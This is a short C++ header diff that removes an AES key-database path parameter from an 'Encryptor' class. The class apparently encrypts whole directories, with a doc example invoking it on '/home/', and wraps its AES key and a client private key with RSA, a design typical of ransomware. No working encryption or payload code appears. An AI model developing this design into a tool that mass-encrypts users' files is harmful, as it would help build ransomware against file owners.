@@ -27,7 +27,6 @@ class Encryptor
 private:
     int _keySize;
     bool _aesKeyInit;
-    std::string _aesKeyDBPath;
     std::vector<std::thread> _threads;
 
     std::unique_ptr<rsa::RSAEncryptor> _rsaEncryptorAESKey, _rsaEncryptorCPrivateRSA;
@@ -54,9 +53,8 @@ public:
      *       encryptor->invokeDir("/home/");
      *
      * @param keySize: size of the key
-     * @param aesKeyDBPath:
      */
-    explicit Encryptor(int keySize = 2048, const std::string &aesKeyDBPath = "AES.db");
+    explicit Encryptor(int keySize = 2048);
 
     /**
      * Destructor Encryptor
